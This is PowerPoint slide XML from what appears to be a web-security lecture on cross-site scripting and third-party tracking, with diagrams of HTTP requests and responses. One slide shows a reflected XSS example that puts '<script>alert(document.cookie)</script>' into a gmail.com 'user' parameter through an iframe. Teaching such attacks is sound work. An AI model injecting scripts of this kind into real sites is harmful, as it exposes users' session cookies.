            <a:ext cx="6565219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HTTP/1.1 200 OK</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>&lt;iframe src=https://gmail.com/?user= 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1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt;script&gt;alert(document.cookie)&lt;/script&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>&gt;&lt;/iframe&gt;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4EA161-E54A-4417-9817-35743888D2F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1852502" y="5355771"/>
            <a:ext cx="7362750" cy="23918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8689ECA-C58B-408E-B0F6-65CE01EB67F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1520042" y="6400800"/>
            <a:ext cx="7130742" cy="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A080621-94C2-AF66-B870-55F29B30BBF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4307480" y="5788681"/>
            <a:ext cx="4361251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HTTP/1.1 200 OK</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Hello, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="Picture 3" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\CV070PCD\MC900435242[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6CB482BD-5B33-98B1-6A71-FDA5137FE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652" y="4776366"/>
            <a:ext cx="587706" cy="11628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E9A6DC6-2F8C-1E77-4206-32D37D34492F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9067801" y="4355068"/>
            <a:ext cx="1119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gmail.com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2E3DB7-0498-1436-C815-52C128E6DDEA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4112487" y="4871586"/>
            <a:ext cx="4720919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GET /?user=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6923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41ED0-85C2-CBD7-81F6-28C1CAEF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A01C2C6-DEF7-469D-2EED-3677D8F554B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1684717" y="2675187"/>
            <a:ext cx="7148689" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="317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DF333C7-7CBC-4F58-2133-B412AA5CA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11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/>
              <a:t>Third-Party Tracking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 3" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\CV070PCD\MC900435242[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{94BC32E5-A705-A75F-88D0-190261983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285" y="1678746"/>
            <a:ext cx="503616" cy="9964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" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\BHIGFSU1\MC910216349[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DF611EE-2A03-EDE5-615F-B0FFBA722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10" y="2828195"/>
            <a:ext cx="881979" cy="74718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F7AF3C-12C6-8C1F-FA88-FEB3CEFA8E38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983179" y="1596002"/>
            <a:ext cx="6667605" cy="46003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9A3D522-6269-9438-E38F-CA3C1ADE1C33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4038600" y="1219201"/>
            <a:ext cx="2366931" cy="5847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GET / HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Host:  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>nytimes.com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162C2-64ED-D7D8-FB9B-C61B801519B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8992369" y="1257448"/>
            <a:ext cx="13335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 err="1"/>
              <a:t>nytimes.com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DD76DE-5D8F-936B-E747-E314A6F4ACF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2268187" y="2163238"/>
            <a:ext cx="6565219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HTTP/1.1 200 OK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24FC9C-FA50-3AA0-E17E-D824107E9124}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1470656" y="4857590"/>
            <a:ext cx="7362750" cy="23918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443C45-C034-2B64-9D1C-423D02AD4BDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1520042" y="6400800"/>
            <a:ext cx="7130742" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="317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4C96949-AE87-FD70-44B2-4DE54F3F0A21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2173959" y="5018724"/>
            <a:ext cx="6286043" cy="156966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HTTP/1.1 200 OK</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:b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br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="Picture 3" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\CV070PCD\MC900435242[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EEEE85C-02C3-A426-99C6-F2D704586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195" y="4740579"/>
            <a:ext cx="587706" cy="11628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16E567E-B6AB-A66F-837E-04C43148300E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9042639" y="4402025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tracker.com</a:t>
            </a:r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52101F-1E75-03DC-4BE6-E7D88EA421EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4045071" y="3737813"/>
            <a:ext cx="4720919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GET / …</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="322475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5849</TotalTime>
  <Words>769</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>122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Cross-Site Scripting (XSS) Attack</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting (XSS) Attack</vt:lpstr>
      <vt:lpstr>Third-Party Tracking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Feamster</dc:creator>
  <cp:lastModifiedBy>Nick Feamster</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-10-30T14:57:53Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-03T16:27:42Z</dcterms:modified>
</cp:coreProperties>
</file>